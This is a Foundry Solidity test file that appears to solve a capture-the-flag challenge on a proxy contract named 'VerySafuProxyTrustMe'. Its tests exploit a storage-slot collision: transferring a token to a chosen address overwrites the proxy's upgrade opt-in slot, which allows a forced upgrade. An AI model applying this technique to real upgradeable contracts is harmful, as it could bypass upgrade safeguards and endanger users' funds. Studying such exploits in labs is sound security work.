// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {VerySafuProxyTrustMe} from "../src/VerySafuProxyTrustMe.sol";
import {ERC20} from "../src/ERC20.sol";


contract CounterTest is Test {
    VerySafuProxyTrustMe verysafu;
    ERC20 erc20;
    address owner;
    address admin;
    MockImplementation implementation;

    function setUp() public {
        owner = makeAddr("Owner");
        admin = makeAddr("Admin");

        vm.startPrank(admin);
        erc20 = new ERC20();
        verysafu = new VerySafuProxyTrustMe(address(erc20), owner);
        vm.stopPrank();

        vm.prank(owner);
        ERC20(address(verysafu)).initialize("Test", "TST", 18, 1000);

        implementation = new MockImplementation();
    }


    function test_exploit() public {
        vm.prank(owner);
        ERC20(address(verysafu)).transfer(0x47Adc0faA4f6Eb42b499187317949eD99E77EE85, 1);

        vm.startPrank(admin);
        verysafu.upgrade(address(implementation));
        vm.stopPrank();
    }

    function test_bytes() public{
        bytes32 _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
        bytes32 _ADMIN_SLOT = 0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103;
        bytes32 _OWNER_SLOT = 0xa7b53796fd2d99cb1f5ae019b54f9e024446c3d12b483f733ccc62ed04eb126a;
        bytes32 _OPTIN_SLOT = 0x7b191067458f5b5c0c36f2be8ceaf27679e7ea94b6964093ce9e5c7db2aff82a;
        assertEq(_IMPLEMENTATION_SLOT, bytes32(uint256(keccak256("eip1967.proxy.implementation")) - 1));
        assertEq(_ADMIN_SLOT, bytes32(uint256(keccak256("eip1967.proxy.admin")) - 1));
        assertEq(_OWNER_SLOT, bytes32(uint256(keccak256("eip1967.proxy.owner")) - 1));
        //assertEq(_OPTIN_SLOT, bytes32(uint256(keccak256("eip1967.proxy.optIn")) - 1));

        bytes32 location = keccak256(abi.encodePacked(uint256(uint160(0x47Adc0faA4f6Eb42b499187317949eD99E77EE85)), uint256(1)));
        assertEq(_OPTIN_SLOT, location);

    }

    function test_Amount() public {
        vm.startPrank(owner);
        ERC20(address(verysafu)).transfer(0x47Adc0faA4f6Eb42b499187317949eD99E77EE85, 20);
        vm.assertEq(ERC20(address(verysafu)).balanceOf(0x47Adc0faA4f6Eb42b499187317949eD99E77EE85), 20);

        verysafu.optOutOfUpgrade();

        assertEq(ERC20(address(verysafu)).balanceOf(0x47Adc0faA4f6Eb42b499187317949eD99E77EE85), 0);
    }


}

contract MockImplementation {
    uint256 public value;

    function initialize(uint256 _value) public {
        value = _value;
    }

    function setValue(uint256 _value) public {
        value = _value;
    }
}
